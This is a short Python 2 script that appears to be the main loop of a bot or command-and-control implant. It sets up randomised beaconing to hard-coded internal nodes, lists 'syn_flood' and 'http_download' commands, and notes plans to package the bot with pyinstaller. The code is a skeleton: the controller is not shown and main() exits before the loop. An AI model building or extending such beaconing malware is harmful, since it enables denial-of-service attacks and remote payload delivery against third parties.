#!/usr/bin/env python

from controller import Controller
import time
from random import randint

#
# Overall configurations should include:
# - XML to be parsed by Python to provide Strings of available modules
# - A pyinstaller
#
# TODO:
# - Prevent replay
# - Add active day and active hour calculation to calculate_sleep()
#
# READ:
# - http://docs.python-guide.org/en/latest/shipping/freezing/
# - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
# - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/
# - http://stackoverflow.com/questions/9689355/python-import-or-pass-modules-as-paramaters

MIN_SLEEP_INT = 60
MAX_SLEEP_INT = 600
ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
ACTIVE_HOURS = ('0001','2359')
NODES = [('http','192.168.2.2','80'),('socket','192.168.2.3','5585')]

# global flag
continue_beacon = True

def load_config():
    #
    # this is where the configuration file is parsed.
    #
    beacons = ['http_get']
    commands = ['syn_flood','http_download']
    decoders = ['json','base64']
    
    return (beacons,commands,decoders)
    
def calculate_sleep():

    #cur_time = time.ctime()
    sleep_time = 0

    sleep_time += randint(MIN_SLEEP_INT,MAX_SLEEP_INT)
    
    return sleep_time
    

def start_beacon_loop(controller):
    
    while continue_beacon:
        
        controller.beacon(NODES)
        time.sleep(calculate_sleep())
        
    return True
                

def main():
    
    print "starting..."
    beacons, commands, decoders = load_config()
    
    print "Building controller..."
    controller = Controller(beacons, commands, decoders)
    
    print "finished!"
    exit()
    start_beacon_loop(controller)

if __name__ == "__main__":
    main()
